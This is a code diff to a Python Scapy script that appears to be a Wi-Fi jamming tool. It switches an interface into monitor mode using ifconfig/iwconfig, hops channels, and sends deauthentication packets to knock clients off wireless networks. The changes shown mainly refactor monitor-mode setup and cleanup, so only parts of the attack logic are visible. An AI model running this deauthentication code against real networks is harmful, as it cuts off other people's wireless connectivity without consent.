@@ -5,11 +5,11 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
 from scapy.all import *
 conf.verb = 0 # Scapy I thought I told you to shut up
 import os
-from threading import Thread
 import sys
-from subprocess import Popen, call, PIPE
-from signal import SIGINT, SIGTERM, signal
+import time
 from threading import Thread, Lock
+from subprocess import Popen, PIPE
+from signal import SIGINT, signal
 import argparse
 import socket
 import struct
@@ -99,8 +99,6 @@ def get_iface(interfaces):
         print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
     try:
         interface = max(scanned_aps)[1]
-        if interfaces[interface] == 1:
-            raw_input('['+R+'-'+W+'] Disconnect '+G+interface+W+' from its network or channel hopping will fail. When done hit [ENTER]')
         return interface
     except Exception as e:
         for iface in interfaces:
@@ -111,16 +109,18 @@ def get_iface(interfaces):
 
 def start_mon_mode(interface):
     print '['+G+'+'+W+'] Starting monitor mode on '+G+interface+W
-    proc = Popen(['airmon-ng', 'start', interface], stdout=PIPE, stderr=DN)
-    for line in proc.communicate()[0].split('\n'):
-        if 'monitor mode enabled on' in line:
-            line = line.split()
-            monmode = line[4][:-1] # -1 because it ends in ')'
-            return monmode
-    sys.exit("Could not start airmon-ng.")
+    try:
+        os.system('ifconfig %s down' % interface)
+        os.system('iwconfig %s mode monitor' % interface)
+        os.system('ifconfig %s up' % interface)
+        return interface
+    except Exception:
+        sys.exit('['+R+'-'+W+'] Could not start monitor mode')
 
-def remove_mon_iface():
-    proc = Popen(['airmon-ng', 'stop', mon_iface], stdout=PIPE, stderr=DN)
+def remove_mon_iface(mon_iface):
+    os.system('ifconfig %s down' % mon_iface)
+    os.system('iwconfig %s mode managed' % mon_iface)
+    os.system('ifconfig %s up' % mon_iface)
 
 def mon_mac(mon_iface):
     '''
@@ -160,17 +160,12 @@ def channel_hop(mon_iface, args):
         err = None
         for line in proc.communicate()[1].split('\n'):
             if len(line) > 2: # iw dev shouldnt display output unless there's an error
-                err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W+'\n    \
-Try disconnecting the monitor mode\'s parent interface (e.g. wlan0)\n    \
-from the network if you have not already\n'
+                err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W
 
         output(err, monchannel)
         deauth(monchannel)
         if first_pass == 1:
             time.sleep(1)
-        else:
-            #time.sleep(1)
-            pass
 
 def deauth(monchannel):
     '''
@@ -217,6 +212,7 @@ def deauth(monchannel):
         for p in pkts:
             send(p, inter=float(args.timeinterval), count=int(args.packets))
             #pass
+        #time.sleep(.5)
 
 def output(err, monchannel):
     os.system('clear')
@@ -333,7 +329,7 @@ def stop(signal, frame):
     if monitor_on:
         sys.exit('\n['+R+'!'+W+'] Closing')
     else:
-        remove_mon_iface()
+        remove_mon_iface(mon_iface)
         sys.exit('\n['+R+'!'+W+'] Closing')
 
 
@@ -361,5 +357,6 @@ if __name__ == "__main__":
     try:
        sniff(iface=mon_iface, store=0, prn=cb)
     except Exception as msg:
+        remove_mon_iface(mon_iface)
         print '\n['+R+'!'+W+'] Closing:', msg
         sys.exit(0)
